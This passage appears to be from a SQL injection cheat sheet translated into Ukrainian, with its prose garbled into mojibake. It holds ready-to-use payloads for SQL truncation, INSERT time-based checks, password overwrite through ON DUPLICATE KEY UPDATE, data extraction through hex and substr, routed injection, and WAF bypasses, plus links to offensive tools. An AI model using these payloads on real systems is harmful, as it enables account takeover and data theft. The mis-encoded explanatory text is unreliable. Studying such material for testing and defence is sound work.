–ë–∞–∑–∞ –¥–∞–Ω–∏—Ö –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç—å, —á–∏ –≤–≤–µ–¥–µ–Ω–µ **—ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —ñ—Å–Ω—É—î** –≤ –±–∞–∑—ñ –¥–∞–Ω–∏—Ö. –Ø–∫—â–æ **–Ω—ñ**, –≤–æ–Ω–∞ **–æ–±—Ä—ñ–∂–µ** **—ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** –¥–æ **–º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ –¥–æ–ø—É—Å—Ç–∏–º–æ—ó –∫—ñ–ª—å–∫–æ—Å—Ç—ñ —Å–∏–º–≤–æ–ª—ñ–≤** (—É —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –¥–æ: "_admin \[25 –ø—Ä–æ–±—ñ–ª—ñ–≤]_"), –∞ –ø–æ—Ç—ñ–º **–∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –≤–∏–¥–∞–ª–∏—Ç—å –≤—Å—ñ –ø—Ä–æ–±—ñ–ª–∏ –≤ –∫—ñ–Ω—Ü—ñ, –æ–Ω–æ–≤–∏–≤—à–∏** –≤ –±–∞–∑—ñ –¥–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ "**–∞–¥–º—ñ–Ω**" –∑ **–Ω–æ–≤–∏–º –ø–∞—Ä–æ–ª–µ–º** (–º–æ–∂–µ –∑'—è–≤–∏—Ç–∏—Å—è –¥–µ—è–∫–∞ –ø–æ–º–∏–ª–∫–∞, –∞–ª–µ —Ü–µ –Ω–µ –æ–∑–Ω–∞—á–∞—î, —â–æ —Ü–µ –Ω–µ –ø—Ä–∞—Ü—é—î).

–î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è: [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_–ü—Ä–∏–º—ñ—Ç–∫–∞: –¶—è –∞—Ç–∞–∫–∞ –±—ñ–ª—å—à–µ –Ω–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏–º–µ, —è–∫ –æ–ø–∏—Å–∞–Ω–æ –≤–∏—â–µ –≤ –æ—Å—Ç–∞–Ω–Ω—ñ—Ö –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è—Ö MySQL. –•–æ—á–∞ –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è –≤—Å–µ —â–µ —ñ–≥–Ω–æ—Ä—É—é—Ç—å –ø—Ä–æ–±—ñ–ª–∏ –≤ –∫—ñ–Ω—Ü—ñ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, —Å–ø—Ä–æ–±–∞ –≤—Å—Ç–∞–≤–∏—Ç–∏ —Ä—è–¥–æ–∫, —è–∫–∏–π –¥–æ–≤—à–∏–π –∑–∞ –¥–æ–≤–∂–∏–Ω—É –ø–æ–ª—è, –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ –ø–æ–º–∏–ª–∫–∏, —ñ –≤—Å—Ç–∞–≤–∫–∞ –±—É–¥–µ –Ω–µ–≤–¥–∞–ª–æ—é. –î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ —Ü–µ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ: [https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)_

### –ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ —á–∞—Å—É –≤—Å—Ç–∞–≤–∫–∏ MySQL

–î–æ–¥–∞–π—Ç–µ —Å—Ç—ñ–ª—å–∫–∏ `','',''`, —Å–∫—ñ–ª—å–∫–∏ –≤–≤–∞–∂–∞—î—Ç–µ –∑–∞ –ø–æ—Ç—Ä—ñ–±–Ω–µ, —â–æ–± –≤–∏–π—Ç–∏ –∑ –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞ VALUES. –Ø–∫—â–æ –∑–∞—Ç—Ä–∏–º–∫–∞ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è, —É –≤–∞—Å —î SQLInjection.
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### –ù–ê –û–ù–û–í–õ–ï–ù–ù–Ø –ü–û–í–¢–û–†–ù–û–ì–û –ö–õ–Æ–ß–ê

–ö–ª–∞—É–∑–∞ `ON DUPLICATE KEY UPDATE` –≤ MySQL –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –≤–∫–∞–∑—ñ–≤–∫–∏ –¥—ñ–π, —è–∫—ñ –±–∞–∑–∞ –¥–∞–Ω–∏—Ö –ø–æ–≤–∏–Ω–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏, –∫–æ–ª–∏ —Å–ø—Ä–æ–±—É—î –≤—Å—Ç–∞–≤–∏—Ç–∏ —Ä—è–¥–æ–∫, —â–æ –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ –¥—É–±–ª—é–≤–∞–Ω–Ω—è –∑–Ω–∞—á–µ–Ω–Ω—è –≤ —É–Ω—ñ–∫–∞–ª—å–Ω–æ–º—É —ñ–Ω–¥–µ–∫—Å—ñ –∞–±–æ –ø–µ—Ä–≤–∏–Ω–Ω–æ–º—É –∫–ª—é—á—ñ. –ù–∞–≤–µ–¥–µ–Ω–∏–π –Ω–∏–∂—á–µ –ø—Ä–∏–∫–ª–∞–¥ –¥–µ–º–æ–Ω—Å—Ç—Ä—É—î, —è–∫ —Ü—é —Ñ—É–Ω–∫—Ü—ñ—é –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –∑–º—ñ–Ω–∏ –ø–∞—Ä–æ–ª—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞:

–ü—Ä–∏–∫–ª–∞–¥ –í–Ω–µ–¥–µ–Ω–Ω—è –ü—ñ–¥–∫–∞–∑–∫–∏:

–ü—ñ–¥–∫–∞–∑–∫–∞ –¥–ª—è –≤–Ω–µ–¥–µ–Ω–Ω—è –º–æ–∂–µ –±—É—Ç–∏ —Å—Ç–≤–æ—Ä–µ–Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º, –¥–µ —Å–ø—Ä–æ–±—É—î—Ç—å—Å—è –≤—Å—Ç–∞–≤–∏—Ç–∏ –¥–≤–∞ —Ä—è–¥–∫–∏ –≤ —Ç–∞–±–ª–∏—Ü—é `users`. –ü–µ—Ä—à–∏–π —Ä—è–¥–æ–∫ - —Ü–µ –ø—ñ–¥—Å—Ç–∞–≤–∞, –∞ –¥—Ä—É–≥–∏–π —Ä—è–¥–æ–∫ –Ω–∞—Ü—ñ–ª–µ–Ω–æ –Ω–∞ —ñ—Å–Ω—É—é—á–∏–π –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–∏–π –ª–∏—Å—Ç –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –∑ –º–µ—Ç–æ—é –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–∞—Ä–æ–ª—è:
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```
–û—Å—å —è–∫ —Ü–µ –ø—Ä–∞—Ü—é—î:

- –ó–∞–ø–∏—Ç –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è –≤—Å—Ç–∞–≤–∏—Ç–∏ –¥–≤–∞ —Ä—è–¥–∫–∏: –æ–¥–∏–Ω –¥–ª—è `generic_user@example.com` —ñ —ñ–Ω—à–∏–π –¥–ª—è `admin_generic@example.com`.
- –Ø–∫—â–æ —Ä—è–¥–æ–∫ –¥–ª—è `admin_generic@example.com` –≤–∂–µ —ñ—Å–Ω—É—î, —Å–ø—Ä–∞—Ü—å–æ–≤—É—î —É–º–æ–≤–∞ `ON DUPLICATE KEY UPDATE`, —è–∫–∞ –≤–∫–∞–∑—É—î MySQL –æ–Ω–æ–≤–∏—Ç–∏ –ø–æ–ª–µ `password` —ñ—Å–Ω—É—é—á–æ–≥–æ —Ä—è–¥–∫–∞ –Ω–∞ "bcrypt_hash_of_newpassword".
- –í —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ñ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é –º–æ–∂–Ω–∞ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤–∏–∫–æ–Ω–∞—Ç–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ `admin_generic@example.com` –∑ –ø–∞—Ä–æ–ª–µ–º, —â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î —Ö–µ—à—É bcrypt ("bcrypt_hash_of_newpassword" –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—î —Ö–µ—à bcrypt –Ω–æ–≤–æ–≥–æ –ø–∞—Ä–æ–ª—è, —è–∫–∏–π —Å–ª—ñ–¥ –∑–∞–º—ñ–Ω–∏—Ç–∏ –Ω–∞ —Ñ–∞–∫—Ç–∏—á–Ω–∏–π —Ö–µ—à –±–∞–∂–∞–Ω–æ–≥–æ –ø–∞—Ä–æ–ª—è).

### –í–∏—Ç—è–≥–Ω–µ–Ω–Ω—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó

#### –°—Ç–≤–æ—Ä–µ–Ω–Ω—è 2 –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ –æ–¥–Ω–æ—á–∞—Å–Ω–æ

–ü—Ä–∏ —Å–ø—Ä–æ–±—ñ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –ø–æ—Ç—Ä—ñ–±–Ω—ñ –ø–∞—Ä–æ–ª—å —Ç–∞ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–∞ –ø–æ—à—Ç–∞:
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –¥–µ—Å—è—Ç–∫–æ–≤–æ–≥–æ –∞–±–æ —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–æ–≥–æ —Ñ–æ—Ä–º–∞—Ç—É

–ó–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏—Ç—è–≥–Ω—É—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, —Å—Ç–≤–æ—Ä–∏–≤—à–∏ –ª–∏—à–µ 1 –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å. –í–∞–∂–ª–∏–≤–æ –∑–∞—É–≤–∞–∂–∏—Ç–∏, —â–æ –≤–∞–º –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –∫–æ–º–µ–Ω—Ç—É–≤–∞—Ç–∏ –Ω—ñ—á–æ–≥–æ.

–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **hex2dec** —Ç–∞ **substr**:
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
–©–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ç–µ–∫—Å—Ç, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏:
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **hex** —Ç–∞ **replace** (—ñ **substr**):
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
‚Äã

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) - —Ü–µ –Ω–∞–π–±—ñ–ª—å—à –≤–∞–∂–ª–∏–≤–∞ –ø–æ–¥—ñ—è –∑ –∫—ñ–±–µ—Ä–±–µ–∑–ø–µ–∫–∏ –≤ **–Ü—Å–ø–∞–Ω—ñ—ó** —Ç–∞ –æ–¥–Ω–∞ –∑ –Ω–∞–π–≤–∞–∂–ª–∏–≤—ñ—à–∏—Ö –≤ **–Ñ–≤—Ä–æ–ø—ñ**. –ó **–º—ñ—Å—ñ—î—é –ø—Ä–æ—Å—É–≤–∞–Ω–Ω—è —Ç–µ—Ö–Ω—ñ—á–Ω–∏—Ö –∑–Ω–∞–Ω—å**, —Ü–µ–π –∫–æ–Ω–≥—Ä–µ—Å —î –≤–∞–∂–ª–∏–≤–æ—é –∑—É—Å—Ç—Ä—ñ—á—á—é –¥–ª—è –ø—Ä–æ—Ñ–µ—Å—ñ–æ–Ω–∞–ª—ñ–≤ —É –≥–∞–ª—É–∑—ñ —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ–π —Ç–∞ –∫—ñ–±–µ—Ä–±–µ–∑–ø–µ–∫–∏ —É –±—É–¥—å-—è–∫—ñ–π –¥–∏—Å—Ü–∏–ø–ª—ñ–Ω—ñ.

{% embed url="https://www.rootedcon.com/" %}

## Routed SQL injection

Routed SQL injection - —Ü–µ —Å–∏—Ç—É–∞—Ü—ñ—è, –∫–æ–ª–∏ –∑–∞–ø–∏—Ç, —è–∫–∏–π –º–æ–∂–Ω–∞ –≤–ø—Ä–æ–≤–∞–¥–∏—Ç–∏, –Ω–µ —î —Ç–∏–º, —â–æ –Ω–∞–¥–∞—î –≤–∏—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ, –∞–ª–µ –≤–∏—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ –∑–∞–ø–∏—Ç—É, —è–∫–∏–π –º–æ–∂–Ω–∞ –≤–ø—Ä–æ–≤–∞–¥–∏—Ç–∏, –π–¥—É—Ç—å –¥–æ –∑–∞–ø–∏—Ç—É, —è–∫–∏–π –Ω–∞–¥–∞—î –≤–∏—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ. ([–ó –ø–∞–ø–µ—Ä—É](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

–ü—Ä–∏–∫–ª–∞–¥:
```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## –û–±—Ö—ñ–¥ WAF

[–ü–æ—á–∞—Ç–∫–æ–≤—ñ –æ–±—Ö–æ–¥–∏ –∑–≤—ñ–¥—Å–∏](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### –û–±—Ö—ñ–¥ –±–µ–∑ –ø—Ä–æ–±—ñ–ª—ñ–≤

–ë–µ–∑ –ø—Ä–æ–±—ñ–ª—ñ–≤ (%20) - –æ–±—Ö—ñ–¥ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤ –ø—Ä–æ–ø—É—Å–∫–∞–Ω–Ω—è –ø—Ä–æ–±—ñ–ª—ñ–≤
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
### No Whitespace - –æ–±—Ö—ñ–¥ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–º–µ–Ω—Ç–∞—Ä—ñ–≤

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞—î—Ç–µ, —â–æ –≤ SQL-–∑–∞–ø–∏—Ç—ñ –Ω–µ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø—Ä–æ–±—ñ–ª–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∫–æ–º–µ–Ω—Ç–∞—Ä—ñ –¥–ª—è –æ–±—Ö–æ–¥—É —Ü—å–æ–≥–æ –æ–±–º–µ–∂–µ–Ω–Ω—è. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –∑–∞–º—ñ—Å—Ç—å –ø—Ä–æ–±—ñ–ª—ñ–≤ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∫–æ–º–µ–Ω—Ç–∞—Ä—ñ —Ç–∏–ø—É `/* */` –∞–±–æ `--`. –ù–∞–ø—Ä–∏–∫–ª–∞–¥:

```sql
SELECT/* */username/**/FROM/* */users;
```

–¶–µ–π –∑–∞–ø–∏—Ç –±—É–¥–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏—Å—è –ø—Ä–∞–≤–∏–ª—å–Ω–æ, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—Å—ñ –ø—Ä–æ–±—ñ–ª–∏ –∑–∞–º—ñ–Ω–µ–Ω—ñ –∫–æ–º–µ–Ω—Ç–∞—Ä—è–º–∏.
```sql
?id=1/*comment*/and/**/1=1/**/--
```
### –ë–µ–∑ –ø—Ä–æ–ø—É—Å–∫—ñ–≤ - –æ–±—Ö—ñ–¥ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –¥—É–∂–æ–∫

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞—î—Ç–µ, —â–æ –≤—Ä–∞–∑–ª–∏–≤–∏–π –ø–∞—Ä–∞–º–µ—Ç—Ä –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –¥—É–∂–æ–∫, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ–π –º–µ—Ç–æ–¥ –¥–ª—è –æ–±—Ö–æ–¥—É —Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó –ø—Ä–æ–±—ñ–ª—ñ–≤. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –¥—É–∂–∫–∏ –¥–ª—è –æ–±–≥–æ—Ä—Ç–∞–Ω–Ω—è –≤–∞—à–æ–≥–æ SQL-–∫–æ–¥—É, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ –±–ª–æ–∫—É–≤–∞–Ω–Ω—è —á–µ—Ä–µ–∑ –ø—Ä–æ–±—ñ–ª–∏.
```sql
?id=(1)and(1)=(1)--
```
### –ë–µ–∑ –∫–æ–º

–ë–µ–∑ –∫–æ–º - –æ–±—Ö—ñ–¥ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é OFFSET, FROM —Ç–∞ JOIN
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### –ó–∞–≥–∞–ª—å–Ω—ñ –æ–±—Ö—ñ–¥–Ω—ñ –º–µ—Ç–æ–¥–∏

–ß–æ—Ä–Ω–∏–π —Å–ø–∏—Å–æ–∫ –∑–∞ –∫–ª—é—á–æ–≤–∏–º–∏ —Å–ª–æ–≤–∞–º–∏ - –æ–±—Ö—ñ–¥ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤–µ—Ä—Ö–Ω—å–æ–≥–æ/–Ω–∏–∂–Ω—å–æ–≥–æ —Ä–µ–≥—ñ—Å—Ç—Ä—É
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
–ß–æ—Ä–Ω–∏–π —Å–ø–∏—Å–æ–∫ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–ª—é—á–æ–≤–∏—Ö —Å–ª—ñ–≤ –±–µ–∑ —É—Ä–∞—Ö—É–≤–∞–Ω–Ω—è —Ä–µ–≥—ñ—Å—Ç—Ä—É - –æ–±—Ö—ñ–¥ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç–Ω–æ–≥–æ –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### –ù–∞—É–∫–æ–≤–∞ –Ω–æ—Ç–∞—Ü—ñ—è WAF –æ–±—Ö—ñ–¥

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –±—ñ–ª—å—à –¥–µ—Ç–∞–ª—å–Ω–µ –ø–æ—è—Å–Ω–µ–Ω–Ω—è —Ü—å–æ–≥–æ —Ç—Ä—é–∫—É –≤ [–±–ª–æ–∑—ñ gosecure](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/).\
–ü–æ —Å—É—Ç—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–∞—É–∫–æ–≤—É –Ω–æ—Ç–∞—Ü—ñ—é —É –Ω–µ–æ—á—ñ–∫—É–≤–∞–Ω–∏—Ö —Å–ø–æ—Å–æ–±–∞—Ö –¥–ª—è –æ–±—Ö–æ–¥—É WAF:
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### –û–±—Ö—ñ–¥ –æ–±–º–µ–∂–µ–Ω—å –Ω–∞–∑–≤ —Å—Ç–æ–≤–ø—Ü—ñ–≤

–ü–æ-–ø–µ—Ä—à–µ, –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —è–∫—â–æ **–ø–æ—á–∞—Ç–∫–æ–≤–∏–π –∑–∞–ø–∏—Ç —Ç–∞ —Ç–∞–±–ª–∏—Ü—è, –∑ —è–∫–æ—ó –≤–∏ —Ö–æ—á–µ—Ç–µ –≤–∏—Ç—è–≥–Ω—É—Ç–∏ –ø—Ä–∞–ø–æ—Ä–µ—Ü—å, –º–∞—é—Ç—å –æ–¥–Ω–∞–∫–æ–≤—É –∫—ñ–ª—å–∫—ñ—Å—Ç—å —Å—Ç–æ–≤–ø—Ü—ñ–≤**, –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –≤–∏–∫–æ–Ω–∞—Ç–∏: `0 UNION SELECT * FROM flag`

–ú–æ–∂–ª–∏–≤–æ **–æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ç—Ä–µ—Ç—å–æ–≥–æ —Å—Ç–æ–≤–ø—Ü—è —Ç–∞–±–ª–∏—Ü—ñ –±–µ–∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –π–æ–≥–æ –Ω–∞–∑–≤–∏** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∑–∞–ø–∏—Ç—É –Ω–∞ –∫—à—Ç–∞–ª—Ç –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, –æ—Ç–∂–µ, —É –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ sqlinjection —Ü–µ –±—É–¥–µ –≤–∏–≥–ª—è–¥–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º:
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
–ê–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **–æ–±—Ö—ñ–¥ –∫–æ–º–∏**:
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
–¶–µ–π —Ç—Ä—é–∫ –±—É–≤ –≤–∑—è—Ç–∏–π –∑ [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)

### –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –¥–ª—è –æ–±—Ö—ñ–¥—É WAF

{% embed url="https://github.com/m4ll0k/Atlas" %}

## –Ü–Ω—à—ñ –ø–æ—Å—ñ–±–Ω–∏–∫–∏

* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## –°–ø–∏—Å–æ–∫ –≤–∏—è–≤–ª–µ–Ω–Ω—è –ø–µ—Ä–µ–±–æ—Ä—É

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}



‚Äã

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) —î –Ω–∞–π–±—ñ–ª—å—à –≤–∞–∂–ª–∏–≤–æ—é –ø–æ–¥—ñ—î—é –∑ –∫—ñ–±–µ—Ä–±–µ–∑–ø–µ–∫–∏ –≤ **–Ü—Å–ø–∞–Ω—ñ—ó** —Ç–∞ –æ–¥–Ω—ñ—î—é –∑ –Ω–∞–π–≤–∞–∂–ª–∏–≤—ñ—à–∏—Ö –≤ **–Ñ–≤—Ä–æ–ø—ñ**. –ó **–º—ñ—Å—ñ—î—é –ø—Ä–æ—Å—É–≤–∞–Ω–Ω—è —Ç–µ—Ö–Ω—ñ—á–Ω–∏—Ö –∑–Ω–∞–Ω—å**, —Ü–µ–π –∫–æ–Ω–≥—Ä–µ—Å —î –∫–∏–ø—É—á–æ—é —Ç–æ—á–∫–æ—é –∑—É—Å—Ç—Ä—ñ—á—ñ –¥–ª—è –ø—Ä–æ—Ñ–µ—Å—ñ–æ–Ω–∞–ª—ñ–≤ —Ç–µ—Ö–Ω–æ–ª–æ–≥—ñ–π —Ç–∞ –∫—ñ–±–µ—Ä–±–µ–∑–ø–µ–∫–∏ —É –±—É–¥—å-—è–∫—ñ–π 